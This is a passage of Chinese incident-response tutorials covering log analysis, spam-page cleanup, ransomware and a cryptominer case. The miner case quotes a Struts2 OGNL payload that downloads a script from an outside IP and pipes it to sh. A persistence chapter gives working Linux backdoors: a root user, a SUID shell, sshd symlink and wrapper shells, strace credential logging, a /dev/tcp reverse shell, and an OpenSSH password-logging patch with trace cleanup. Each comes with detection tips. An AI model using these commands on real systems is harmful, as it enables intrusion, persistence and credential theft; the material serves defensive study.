$1&quot;.&quot;$2&quot;.&quot;$3&quot;.0&quot;&#125;&#x27;</span> | sort | uniq -c | sort -r -n | head -n <span class="number">200</span></span><br></pre></td></tr></table></figure><p>统计域名：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat  /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log |awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>|sort|uniq -c|sort -rn|more</span><br></pre></td></tr></table></figure><p>HTTP Status：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat  /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log |awk <span class="string">&#x27;&#123;print $9&#125;&#x27;</span>|sort|uniq -c|sort -rn|more</span><br><span class="line"><span class="number">5056585</span> <span class="number">304</span></span><br><span class="line"><span class="number">1125579</span> <span class="number">200</span></span><br><span class="line">   <span class="number">7602</span> <span class="number">400</span></span><br><span class="line">      <span class="number">5</span> <span class="number">301</span></span><br></pre></td></tr></table></figure><p>URL 统计：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat  /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log |awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span>|sort|uniq -c|sort -rn|more</span><br></pre></td></tr></table></figure><p>文件流量统计：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log |awk <span class="string">&#x27;&#123;sum[$7]+=$10&#125;END&#123;for(i in sum)&#123;print sum[i],i&#125;&#125;&#x27;</span>|sort -rn|more</span><br><span class="line"></span><br><span class="line">grep <span class="string">&#x27; 200 &#x27;</span> /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log |awk <span class="string">&#x27;&#123;sum[$7]+=$10&#125;END&#123;for(i in sum)&#123;print sum[i],i&#125;&#125;&#x27;</span>|sort -rn|more</span><br></pre></td></tr></table></figure><p>URL访问量统计：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | egrep <span class="string">&#x27;\?|&amp;&#x27;</span> | sort | uniq -c | sort -rn | more</span><br></pre></td></tr></table></figure><p>脚本运行速度：</p><p>查出运行速度最慢的脚本</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -v <span class="number">0</span>$ /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | awk -F <span class="string">&#x27;\&quot; &#x27;</span> <span class="string">&#x27;&#123;print $4&quot; &quot; $1&#125;&#x27;</span> web.<span class="property">log</span> | awk <span class="string">&#x27;&#123;print $1&quot; &quot;$8&#125;&#x27;</span> | sort -n -k <span class="number">1</span> -r | uniq &gt; <span class="regexp">/tmp/</span>slow_url.<span class="property">txt</span></span><br></pre></td></tr></table></figure><p>IP, URL 抽取：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># tail -f /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | grep <span class="string">&#x27;/test.html&#x27;</span> | awk <span class="string">&#x27;&#123;print $1&quot; &quot;$7&#125;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第06章：Web实战篇第3篇：批量挂黑页</title>
      <link href="/posts/dbf4904b.html"/>
      <url>/posts/dbf4904b.html</url>
      
        <content type="html"><![CDATA[<h2 id="第3篇：批量挂黑页">第3篇：批量挂黑页</h2><p>作为一个网站管理员，你采用开源CMS做网站，比如dedecms，但是有一天，你忽然发现不知何时，网站的友情链接模块被挂大量垃圾链接，网站出现了很多不该有的目录，里面全是博彩相关的网页。而且，攻击者在挂黑页以后，会在一些小论坛注册马甲将你的网站黑页链接发到论坛，引爬虫收录。在搜索引擎搜索网站地址时，收录了一些会出现一些博彩页面，严重影响了网站形象。</p><h3 id="原因分析">原因分析</h3><p>网站存在高危漏洞，常见于一些存在安全漏洞的开源CMS，利用0day批量拿站上传黑页。</p><h3 id="现象描述：">现象描述：</h3><p>某网站被挂了非常多博彩链接，链接形式如下：</p><p>​<a href="http://www.xxx.com/upload/aomendduchangzaixiandobo/index.html">http://www.xxx.com/upload/aomendduchangzaixiandobo/index.html</a></p><p>​<a href="http://www.xxx.com/upload/aomendduchangzaixian/index.html">http://www.xxx.com/upload/aomendduchangzaixian/index.html</a></p><p>​<a href="http://www.xxx.com/upload/aomenzhengguidubowangzhan/index.html">http://www.xxx.com/upload/aomenzhengguidubowangzhan/index.html</a></p><p>链接可以访问，直接访问物理路径也可以看到文件，但是打开网站目录并没有发现这些文件，这些文件到底藏在了哪？</p><p>访问这些链接，跳转到如图页面：</p><p><img src="./image/3-1.png" alt=""></p><h3 id="问题处理：">问题处理：</h3><p>1、打开电脑文件夹选项卡，取消”隐藏受保护的操作系统文件“勾选，把”隐藏文件和文件夹“下面的单选选择“显示隐藏的文件、文件夹和驱动器”。</p><p><img src="./image/3-2.png" alt=""></p><p>2、再次查看，可以看到半透明的文件夹，清楚隐藏文件夹及所有页面</p><p><img src="./image/3-3.png" alt=""></p><p>3、然后清除IIS临时压缩文件</p><p>C:\inetpub\temp\IIS Temporary Compressed Files\WEBUI$^_gzip_D^\WEB\WEBUI\UPLOAD</p><p><img src="./image/3-4.png" alt=""></p><p>4、投诉快照，申请删除相关的网页收录，减少对网站的影响。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第04章：Windows实战篇第3篇：勒索病毒</title>
      <link href="/posts/df6a0bc7.html"/>
      <url>/posts/df6a0bc7.html</url>
      
        <content type="html"><![CDATA[<h2 id="第3篇：勒索病毒">第3篇：勒索病毒</h2><h3 id="0x00-前言">0x00 前言</h3><p>​勒索病毒，是一种新型电脑病毒，主要以邮件、程序木马、网页挂马的形式进行传播。该病毒性质恶劣、危害极大，一旦感染将给用户带来无法估量的损失。这种病毒利用各种加密算法对文件进行加密，被感染者一般无法解密，必须拿到解密的私钥才有可能破解。自WannaCry勒索病毒在全球爆发之后，各种变种及新型勒索病毒层出不穷。</p><h3 id="0x01-应急场景">0x01 应急场景</h3><p>​某天早上，网站管理员打开OA系统，首页访问异常，显示乱码：</p><p><img src="image/win-7-1.png" alt=""></p><h3 id="0x02-事件分析">0x02 事件分析</h3><p>​登录网站服务器进行排查，在站点目录下发现所有的脚本文件及附件都被加密为.sage结尾的文件，每个文件夹下都有一个!HELP_SOS.hta文件，打包了部分样本：</p><p><img src="image/win-7-2.png" alt=""></p><p>打开!HELP_SOS.hta文件，显示如下：</p><p><img src="image/win-7-3.png" alt=""></p><p>到这里，基本可以确认是服务器中了勒索病毒，上传样本到360勒索病毒网站（<a href="http://lesuobingdu.360.cn">http://lesuobingdu.360.cn</a>）进行分析：确认web服务器中了sage勒索病毒，目前暂时无法解密。</p><p><img src="image/win-7-4.png" alt=""></p><p>绝大多数勒索病毒，是无法解密的，一旦被加密，即使支付也不一定能够获得解密密钥。在平时运维中应积极做好备份工作，数据库与源码分离（类似OA系统附件资源也很重要，也要备份）。</p><p>遇到了，别急，试一试勒索病毒解密工具：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">“拒绝勒索软件”网站</span><br><span class="line"><span class="symbol">https:</span>//www.nomoreransom<span class="meta">.org</span>/<span class="built_in">zh</span>/index.html</span><br><span class="line"><span class="number">360</span>安全卫士勒索病毒专题</span><br><span class="line"><span class="symbol">http:</span>//lesuobingdu<span class="number">.360</span>.cn</span><br></pre></td></tr></table></figure><h3 id="0x04-防范措施">0x04 防范措施</h3><p>​一旦中了勒索病毒，文件会被锁死，没有办法正常访问了，这时候，会给你带来极大的困恼。为了防范这样的事情出现，我们电脑上要先做好一些措施：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>、安装杀毒软件，保持监控开启，定期全盘扫描</span><br><span class="line"><span class="attribute">2</span>、及时更新 Windows安全补丁，开启防火墙临时关闭端口，如<span class="number">445</span>、<span class="number">135</span>、<span class="number">137</span>、<span class="number">138</span>、<span class="number">139</span>、<span class="number">3389</span>等端口</span><br><span class="line"><span class="attribute">3</span>、及时更新web漏洞补丁，升级web组件</span><br><span class="line"><span class="attribute">4</span>、备份。重要的资料一定要备份，谨防资料丢失</span><br><span class="line"><span class="attribute">5</span>、强化网络安全意识，陌生链接不点击，陌生文件不要下载，陌生邮件不要打开</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第05章：Linux实战篇第3篇：挖矿病毒</title>
      <link href="/posts/597e5ce6.html"/>
      <url>/posts/597e5ce6.html</url>
      
        <content type="html"><![CDATA[<h2 id="第3篇：挖矿病毒">第3篇：挖矿病毒</h2><h3 id="0x00-前言">0x00 前言</h3><p>​随着虚拟货币的疯狂炒作，利用挖矿脚本来实现流量变现，使得挖矿病毒成为不法分子利用最为频繁的攻击方式。新的挖矿攻击展现出了类似蠕虫的行为，并结合了高级攻击技术，以增加对目标服务器感染的成功率，通过利用永恒之蓝（EternalBlue）、web攻击多种漏洞（如Tomcat弱口令攻击、Weblogic WLS组件漏洞、Jboss反序列化漏洞、Struts2远程命令执行等），导致大量服务器被感染挖矿程序的现象 。</p><h3 id="0x01-应急场景">0x01 应急场景</h3><p>​某天，安全管理员在登录安全设备巡检时，发现某台网站服务器持续向境外IP发起连接，下载病毒源：</p><p><img src="./image/linux-12-1.png" alt=""></p><p>###0x02 事件分析</p><h4 id="A、排查过程">A、排查过程</h4><p>登录服务器，查看系统进程状态，发现不规则命名的异常进程、异常下载进程 :</p><p><img src="./image/linux-12-2.png" alt=""></p><p><img src="./image/linux-12-3.png" alt=""></p><p>下载logo.jpg，包含脚本内容如下：</p><p><img src="./image/linux-12-4.png" alt=""></p><p>到这里，我们可以发现攻击者下载logo.jpg并执行了里面了shell脚本，那这个脚本是如何启动的呢？</p><p>通过排查系统开机启动项、定时任务、服务等，在定时任务里面，发现了恶意脚本，每隔一段时间发起请求下载病毒源，并执行 。</p><p><img src="./image/linux-12-5.png" alt=""></p><h4 id="B、溯源分析">B、溯源分析</h4><p>​在Tomcat log日志中，我们找到这样一条记录：</p><p><img src="./image/linux-12-6.png" alt=""></p><p>对日志中攻击源码进行摘录如下：</p><p><code>&#123;(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo &quot;*/20 * * * * wget -O - -q http://5.188.87.11/icons/logo.jpg|sh\n*/19 * * * * curl http://5.188.87.11/icons/logo.jpg|sh&quot; | crontab -;wget -O - -q http://5.188.87.11/icons/logo.jpg|sh').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125; </code></p><p>可以发现攻击代码中的操作与定时任务中异常脚本一致，据此推断黑客通过Struct 远程命令执行漏洞向服务器定时任务中写入恶意脚本并执行。</p><h4 id="C、清除病毒">C、清除病毒</h4><p>1、删除定时任务:</p><p><img src="./image/linux-12-7.png" alt=""></p><p>2、终止异常进程:</p><p><img src="./image/linux-12-8.png" alt=""></p><h4 id="D、漏洞修复">D、漏洞修复</h4><p>​升级struts到最新版本</p><h3 id="0x03-防范措施">0x03 防范措施</h3><p>​针对服务器被感染挖矿程序的现象，总结了几种预防措施：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、安装安全软件并升级病毒库，定期全盘扫描，保持实时防护</span><br><span class="line">2、及时更新 Windows安全补丁，开启防火墙临时关闭端口</span><br><span class="line">3、及时更新web漏洞补丁，升级web组件</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第03章：权限维持篇第4篇：Linux权限维持--后门篇</title>
      <link href="/posts/72812da1.html"/>
      <url>/posts/72812da1.html</url>
      
        <content type="html"><![CDATA[<p>本文将对Linux下常见的权限维持技术进行解析，知己知彼百战不殆。</p><p><strong>1、一句话添加用户和密码</strong></p><p>添加普通用户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建一个用户名guest，密码123456的普通用户</span></span><br><span class="line">useradd -p `openssl passwd -1 -salt <span class="string">&#x27;salt&#x27;</span> 123456` guest</span><br><span class="line"></span><br><span class="line"><span class="comment"># useradd -p 方法  ` ` 是用来存放可执行的系统命令,&quot;$()&quot;也可以存放命令执行语句</span></span><br><span class="line">useradd -p <span class="string">&quot;<span class="subst">$(openssl passwd -1 123456)</span>&quot;</span> guest</span><br><span class="line"></span><br><span class="line"><span class="comment"># chpasswd方法</span></span><br><span class="line">useradd guest;<span class="built_in">echo</span> <span class="string">&#x27;guest:123456&#x27;</span>|chpasswd</span><br><span class="line"></span><br><span class="line"><span class="comment"># echo -e方法</span></span><br><span class="line">useradd <span class="built_in">test</span>;<span class="built_in">echo</span> -e <span class="string">&quot;123456\n123456\n&quot;</span> |passwd <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>添加root用户：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建一个用户名guest，密码123456的root用户</span></span><br><span class="line"><span class="attribute">useradd</span> -p `openssl passwd -<span class="number">1</span> -salt &#x27;salt&#x27; <span class="number">123456</span>` guest -o -u <span class="number">0</span> -g root -G root -s /bin/bash -d /home/test</span><br></pre></td></tr></table></figure><p>可疑用户排查技巧：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 查询特权用户特权用户(uid 为0)</span></span><br><span class="line">[root<span class="symbol">@localhost</span> ~]<span class="meta"># awk -F: <span class="string">&#x27;$3==0&#123;print $1&#125;&#x27;</span> /etc/passwd</span></span><br><span class="line"><span class="meta"># 查询可以远程登录的帐号信息</span></span><br><span class="line">[root<span class="symbol">@localhost</span> ~]<span class="meta"># awk <span class="string">&#x27;/\$1|\$6/&#123;print $1&#125;&#x27;</span> /etc/shadow</span></span><br><span class="line"><span class="meta"># 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span></span><br><span class="line">[root<span class="symbol">@localhost</span> ~]<span class="meta"># more /etc/sudoers | grep -v <span class="string">&quot;^#\|^$&quot;</span> | grep <span class="string">&quot;ALL=(ALL)&quot;</span></span></span><br></pre></td></tr></table></figure><p><strong>2、SUID Shell</strong></p><p>Suid shell是一种可用于以拥有者权限运行的shell。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">配合普通用户权限使用</span><br><span class="line"><span class="built_in">cp</span> /bin/bash /tmp/shell</span><br><span class="line"><span class="built_in">chmod</span> u+s /tmp/shell</span><br></pre></td></tr></table></figure><p>使用guest用户登录就可疑获取root权限。</p><p><img src=".%5Cimage%5Cprivilege-5-1.png" alt=""></p><p>备注：bash2针对suid做了一些防护措施，需要使用-p参数来获取一个root shell。另外，普通用户执行这个SUID shell时，一定要使用全路径。</p><p>排查技巧：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在Linux中查找SUID设置的文件</span></span><br><span class="line"><span class="built_in">find</span> . -perm /4000 </span><br><span class="line"><span class="comment"># 在Linux中查找使用SGID设置的文件</span></span><br><span class="line"><span class="built_in">find</span> . -perm /2000</span><br><span class="line"><span class="comment"># 取消s权限</span></span><br><span class="line">chmod u-s /tmp/shell</span><br></pre></td></tr></table></figure><p><strong>3、ssh公私钥免密登录</strong></p><p>在客户端上生成一对公私钥，然后把公钥放到服务器上（~/.ssh/authorized_keys），保留私钥。当ssh登录时，ssh程序会发送私钥去和服务器上的公钥做匹配。如果匹配成功就可以登录了。</p><p>客户端：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh-keygen -t rsa</span></span><br></pre></td></tr></table></figure><p>过程中按三次回车，执行结束如下图:</p><p><img src=".%5Cimage%5Cprivilege-5-2.png" alt=""></p><p>进入/root/.ssh/文件夹，查看文件夹的内容，如下所示：</p><p><img src=".%5Cimage%5Cprivilege-5-3.png" alt=""></p><p>其中 <code>id_rsa</code>为私钥，<code>id_rsa.pub</code>为公钥，接下来打开<code>id_rsa.pub</code>，将内容复制到服务器。将<code>id_rsa.pub</code>的内容追加到<code>/root/.ssh/authorized_keys</code>内，配置完成。</p><p>排查技巧：查看<code>/root/.ssh/authorized_keys</code>是否被修改。</p><p><strong>4、软连接</strong></p><p>在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为sufficient时只要pam_rootok模块检测uid为0即root权限即可成功认证登陆。通过软连接的方式，实质上PAM认证是通过软连接的文件名 <code>/tmp/su</code> 在<code>/etc/pam.d/</code>目录下寻找对应的PAM配置文件(如: /etc/pam.d/su)，任意密码登陆的核心是<code>auth sufficient pam_rootok.so</code>，所以只要PAM配置文件中包含此配置即可SSH任意密码登陆，除了su中之外还有chsh、chfn同样可以。</p><p>在目标服务器上执行一句话后门：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888</span><br></pre></td></tr></table></figure><p>执行完之后，任何一台机器<code>ssh root@IP -p 8888</code>，输入任意密码，成功登录。</p><p><img src=".%5Cimage%5Cprivilege-5-4.png" alt=""></p><p>排查技巧：进程、端口都可以发现异常， kill -s 9 PID 结束进程即可清除后门。</p><p><img src=".%5Cimage%5Cprivilege-5-4-1.png" alt=""></p><p><strong>5、SSH wrapper</strong></p><p>首先启动的是/usr/sbin/sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动/usr/bin/sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的/usr/sbin/sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell</p><p>简单点就是从sshd fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。</p><p>服务端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/sbin/</span><br><span class="line"><span class="built_in">mv</span> sshd ../bin/</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/usr/bin/perl&#x27;</span> &gt;sshd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&#x27;</span> &gt;&gt;sshd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;exec&#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27;</span> &gt;&gt;sshd</span><br><span class="line"><span class="built_in">chmod</span> u+x sshd</span><br><span class="line">/etc/init.d/sshd restart</span><br></pre></td></tr></table></figure><p>客户端：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">socat STDIO TCP4:target_ip:22,sourceport=13377</span><br><span class="line"></span><br><span class="line">#如果你想修改源端口，可以用python的struct标准库实现。其中x00x00LF是19526的大端形式，便于传输和处理。</span><br><span class="line"><span class="meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="keyword">import</span> struct</span></span><br><span class="line"><span class="meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">buffer = struct.pack(<span class="string">&#x27;&gt;I6&#x27;</span>,<span class="number">19526</span>)</span></span><br><span class="line"><span class="meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="built_in">print</span> <span class="built_in">repr</span>(buffer)</span></span><br><span class="line">&#x27;\x00\x00LF&#x27;</span><br><span class="line"><span class="meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">buffer = struct.pack(<span class="string">&#x27;&gt;I6&#x27;</span>,<span class="number">13377</span>)</span></span><br><span class="line"><span class="meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="built_in">print</span> buffer</span></span><br><span class="line">4A</span><br></pre></td></tr></table></figure><p><img src=".%5Cimage%5Cprivilege-5-5.png" alt=""></p><p>排查技巧：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">ls</span> -al /usr/sbin/sshd</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> /usr/sbin/sshd</span></span><br><span class="line">可通过重装ssh服务恢复。</span><br></pre></td></tr></table></figure><p><strong>6、strace后门</strong></p><p>通过命令替换动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#vim /etc/bashrc</span></span><br><span class="line"><span class="built_in">alias</span> ssh=&#x27;strace -o /tmp/.ssh.<span class="built_in">log</span> -e <span class="built_in">read</span>,<span class="built_in">write</span>,connect -s <span class="number">2048</span> ssh&#x27;</span><br><span class="line"><span class="comment"># source /root/.bashrc</span></span><br></pre></td></tr></table></figure><p><img src=".%5Cimage%5Cprivilege-5-5-1.png" alt=""></p><p>排查技巧：使用<code>alias</code>即可发现异常。</p><p><img src=".%5Cimage%5Cprivilege-5-5-2.png" alt=""></p><p><strong>7、crontab反弹shell</strong></p><p>crontab命令用于设置周期性被执行的指令。新建shell脚本，利用脚本进行反弹。</p><p>a、创建shell脚本，例如在/etc/evil.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.28.131/12345  0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><code>chmod +sx /etc/evil.sh</code></p><p>b、crontab -e 设置定时任务</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#每一分钟执行一次</span></span><br><span class="line">*<span class="string">/1</span> * * * * root <span class="string">/etc/evil.sh</span></span><br></pre></td></tr></table></figure><p>重启crond服务，<code>service crond restart</code>，然后就可以用nc接收shell。</p><p><img src=".%5Cimage%5Cprivilege-5-6.png" alt=""></p><p>排查技巧：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看可疑的定时任务列表</span></span><br><span class="line"><span class="attribute">crontab</span> -e</span><br></pre></td></tr></table></figure><p><strong>8、openssh后门</strong></p><p>利用openssh后门，设置SSH后门密码及root密码记录位置，隐蔽性较强，不易被发现。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">a、备份SSH配置文件</span><br><span class="line">mv /etc/ssh/ssh_config /etc/ssh/ssh_config<span class="selector-class">.old</span></span><br><span class="line">mv /etc/ssh/sshd_config /etc/ssh/sshd_config<span class="selector-class">.old</span></span><br><span class="line"></span><br><span class="line">b、解压并安装补丁</span><br><span class="line">tar zxf openssh-<span class="number">5.9</span>p1<span class="selector-class">.tar</span><span class="selector-class">.gz</span></span><br><span class="line">tar zxf openssh-<span class="number">5.9</span>p1<span class="selector-class">.tar</span><span class="selector-class">.gz</span></span><br><span class="line">cp openssh-<span class="number">5.9</span>p1.patch/sshbd5.<span class="number">9</span>p1<span class="selector-class">.diff</span>  /openssh-<span class="number">5.9</span>p1</span><br><span class="line">cd openssh-<span class="number">5.9</span>p1</span><br><span class="line">patch &lt; sshbd5.<span class="number">9</span>p1<span class="selector-class">.diff</span></span><br><span class="line"></span><br><span class="line">c、记录用户名和密码的文件位置及其密码</span><br><span class="line">vi  includes<span class="selector-class">.h</span></span><br><span class="line"><span class="selector-id">#define</span> ILOG <span class="string">&quot;/tmp/1.txt&quot;</span>             <span class="comment">//记录登录本机的用户名和密码</span></span><br><span class="line"><span class="selector-id">#define</span> OLOG <span class="string">&quot;/tmp/2.txt&quot;</span>             <span class="comment">//记录本机登录远程的用户名和密码</span></span><br><span class="line"><span class="selector-id">#define</span> SECRETPW <span class="string">&quot;123456789&quot;</span>          <span class="comment">//后门的密码</span></span><br><span class="line"></span><br><span class="line">d、修改版本信息</span><br><span class="line">vi version<span class="selector-class">.h</span></span><br><span class="line"><span class="selector-id">#define</span> SSH_VERSION <span class="string">&quot;填入之前记下来的版本号,伪装原版本&quot;</span></span><br><span class="line"><span class="selector-id">#define</span> SSH_PORTABLE <span class="string">&quot;小版本号&quot;</span></span><br><span class="line"></span><br><span class="line">e、安装并编译</span><br><span class="line">./configure <span class="attr">--prefix</span>=/usr <span class="attr">--sysconfdir</span>=/etc/ssh <span class="attr">--with-pam</span> <span class="attr">--with-kerberos5</span></span><br><span class="line">make clean</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">service sshd restart</span><br><span class="line"></span><br><span class="line">f、对比原来的配置文件，使配置文件一致，然后修改文件日期。</span><br><span class="line"></span><br><span class="line">touch -r  /etc/ssh/ssh_config<span class="selector-class">.old</span> /etc/ssh/ssh_config</span><br><span class="line">touch -r  /etc/ssh/sshd_config<span class="selector-class">.old</span> /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line">g、清除操作记录</span><br><span class="line">export HISTFILE=/dev/null</span><br><span 